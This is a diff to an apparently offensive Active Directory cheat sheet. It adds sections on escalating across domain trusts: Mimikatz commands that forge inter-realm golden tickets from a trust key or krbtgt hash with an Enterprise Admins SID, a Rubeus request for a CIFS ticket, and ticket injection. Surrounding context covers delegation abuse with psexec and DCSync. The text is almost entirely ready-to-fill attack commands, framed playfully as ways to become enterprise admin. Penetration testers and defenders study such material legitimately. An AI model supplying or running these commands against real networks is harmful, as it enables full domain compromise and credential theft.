@@ -327,7 +327,7 @@ for example, we could psexec if delegate for cifs:
 psexec.py <domain>/<user-impersonate>@<FQDN-TargetMachine> -k -no-pass -target-ip <ip> -dc-ip <ip>
 ```
   
-#### we can request tgs for another service since there is no sname validation:
+### we can request tgs for another service since there is no sname validation:
   
 ### With kekeo 
   
@@ -351,6 +351,28 @@ or
 ```
 -> then we can dcsync with mimikatz because we got ldap tgs as domain admin
 
+# Pivoting/escalate domain with domain trust key
+
+ask tgt as enterprise admin with the domain trust key:
+```
+Invoke-Mimikatz -Command '"kerberos::golden /user:<anyuser> /domain:<current-domain> /sid:<sid-current-domain> /sids:<sid-target-domain>-519 /rc4:<trust-key> /service:krbtgt /target:<target-dc>"'
+```
+ask tgs:
+```
+Rubeus.exe asktgs /ticket:<ticket-created-before> /service:cifs/<FQDN-DomainController> /dc:<target-dc> /ptt
+```
+-> then exploit the cifs tgs as enterprise admin :)
+
+# Pivoting/escalate domain with krbtgt hash
+create inter-realm tgt:
+```
+Invoke-Mimikatz -Command '"kerberos::golden /user:<anyuser> /domain:<current-domain> /sid:<sid-current-domain> /sids:<sid-target-domain>-519 /krbtgt:<hash>"'
+```
+Inject the TGT ticket
+```
+Invoke-Mimikatz -Command '"kerberos::ptt <Ticket-Path>"'
+```
+-> then exploit the tgt as enterprise admin :)
 --------------------------------------------------------------
 
 # Check LIST
